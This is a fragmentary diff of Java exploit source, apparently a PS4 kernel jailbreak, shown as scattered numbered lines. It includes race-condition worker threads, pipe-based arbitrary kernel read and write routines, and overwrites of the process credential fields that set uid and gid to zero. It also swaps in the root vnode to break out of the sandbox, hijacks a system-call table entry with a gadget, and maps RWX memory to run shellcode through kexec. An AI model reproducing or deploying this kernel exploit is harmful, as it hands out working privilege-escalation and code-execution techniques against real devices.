+470:                iovThreads[i] = new IovThread(iovState);
+471:                iovThreads[i].start();
+474:            // Create uio threads.
+476:                uioThreads[i] = new UioThread(uioState);
+477:                uioThreads[i].start();
+485:            // Initialize pktopts.
+559:    private static long kreadSlow64(long address) {
+560:        return kreadSlow(address, Int64.SIZE).getLong(0x00);
+564:        kwrite32(fp + 0x28, kread32(fp + 0x28) + 1); // f_count
+568:        return kread64(fdt_ofiles + fd * FILEDESCENT_SIZE);
+573:        long f_data = kread64(fp + 0x00);
+574:        long so_pcb = kread64(f_data + 0x18);
+575:        long in6p_outputopts = kread64(so_pcb + 0x118);
+576:        kwrite64(in6p_outputopts + 0x68, 0); // ip6po_rhi_rthdr
+588:        write(masterWpipeFd, victimPipebuf, victimPipebuf.size());
+589:        return (int) read(masterRpipeFd, victimPipebuf, victimPipebuf.size());
+592:    public static int kread(Buffer dest, long src, long n) {
+594:        return (int) read(victimRpipeFd, dest, n);
+597:    public static int kwrite(long dest, Buffer src, long n) {
+599:        return (int) write(victimWpipeFd, src, n);
+602:    public static void kwrite32(long addr, int val) {
+604:        kwrite(addr, tmp, Int32.SIZE);
+607:    public static void kwrite64(long addr, long val) {
+609:        kwrite(addr, tmp, Int64.SIZE);
+612:    public static long kread64(long addr) {
+613:        kread(tmp, addr, Int64.SIZE);
+617:    public static int kread32(long addr) {
+618:        kread(tmp, addr, Int32.SIZE);
+624:        kwrite64(fdt_ofiles + uafSock * FILEDESCENT_SIZE, 0);
+630:                kwrite64(fdt_ofiles + s * FILEDESCENT_SIZE, 0);
+657:				try { Thread.sleep(1); } catch (Exception ignored) {}
+676:            long fd_files = kreadSlow64(kq_fdp);
+679:            long masterRpipeFile = kreadSlow64(fdt_ofiles + masterPipeFd.get(0) * FILEDESCENT_SIZE);
+680:            long victimRpipeFile = kreadSlow64(fdt_ofiles + victimPipeFd.get(0) * FILEDESCENT_SIZE);
+681:            long masterRpipeData = kreadSlow64(masterRpipeFile + 0x00);
+682:            long victimRpipeData = kreadSlow64(victimRpipeFile + 0x00);
+690:            kwriteSlow(masterRpipeData, masterPipebuf);
+710:        long p = kread64(allproc);
+712:            if (kread32(p + 0xb0) == pid) {
+715:            p = kread64(p + 0x00); // p_list.le_next
+722:        long p_ucred = kread64(p + 0x40);
+723:        long prison0 = kread64(p_ucred + 0x30);
+729:        long p_fd = kread64(p + 0x48);
+730:        long rootvnode = kread64(p_fd + i);
+731:        return rootvnode;
+745:        long f_data = kread64(fp + 0x00);
+746:        long pipe_sigio = kread64(f_data + 0xd0);
+747:        long curproc = kread64(pipe_sigio);
+752:            p = kread64(p + 0x08); // p_list.le_prev
+763:        long procFd = kread64(curproc + KernelOffset.PROC_FD);
+764:        long ucred = kread64(curproc + OFFSET_P_UCRED);
+770:        if ((ucred >>> 48) != 0xFFFF) {
+771:            Status.println("bad ucred");
+775:        kwrite32(ucred + 0x04, 0); // cr_uid
+776:        kwrite32(ucred + 0x08, 0); // cr_ruid
+777:        kwrite32(ucred + 0x0C, 0); // cr_svuid
+778:        kwrite32(ucred + 0x10, 1); // cr_ngroups
+779:        kwrite32(ucred + 0x14, 0); // cr_rgid
+786:        kwrite64(ucred + 0x30, prison0);
+789:        kwrite64(ucred + 0x60, -1);
+790:        kwrite64(ucred + 0x68, -1);
+792:        long rootvnode = getRootVnode(0x10);
+793:        if ((rootvnode >>> 48) != 0xFFFF) {
+794:            Status.println("bad rootvnode");
+797:        kwrite64(procFd + 0x10, rootvnode); // fd_rdir
+798:        kwrite64(procFd + 0x18, rootvnode); // fd_jdir
+820:                write(iovSs1, tmp, Int8.SIZE);
+822:                read(iovSs0, tmp, Int8.SIZE);
+840:                write(iovSs1, tmp, Int8.SIZE);
+842:                read(iovSs0, tmp, Int8.SIZE);
+855:            write(iovSs1, tmp, Int8.SIZE);
+862:            read(iovSs0, tmp, Int8.SIZE);
+881:            int syNarg = kread32(sysent661Addr);
+882:            long syCall = kread64(sysent661Addr + 8);
+883:            int syThrcnt = kread32(sysent661Addr + 0x2c);
+884:            kwrite32(sysent661Addr, 2);
+885:            kwrite64(sysent661Addr + 8, kBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
+886:            kwrite32(sysent661Addr + 0x2c, 1);
+896:            long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long) alignedMemsz, (long) PROT_RWX);
+897:            // create shm alias with write permission
+898:            long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long) PROT_RW);
+899:            // map shadow mapping and write into it
+900:            Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long) alignedMemsz, (long) PROT_RW, 0x11L, writeHandle,
+903:                api.write8(shadowMappingAddr + i, shellcode[i]);
+906:            Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long) alignedMemsz, (long) PROT_RWX, 0x11L, execHandle, 0L);
+907:            Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
+908:            kwrite32(sysent661Addr, syNarg);
+909:            kwrite64(sysent661Addr + 8, syCall);
+910:            kwrite32(sysent661Addr + 0x2c, syThrcnt);
+911:            Helper.syscall(Helper.SYS_CLOSE, writeHandle);
+921:            NativeInvoke.sendNotificationRequest("Already Jailbroken");
+970:    static class IovThread extends Thread {
+973:        public IovThread(WorkerState state) {
+991:    static class UioThread extends Thread {
+994:        public UioThread(WorkerState state) {
+1005:                        writev(uioSs1, uioIovRead, UIO_IOV_NUM);
+1007:                        readv(uioSs0, uioIovWrite, UIO_IOV_NUM);
+1016:    static class WorkerState {
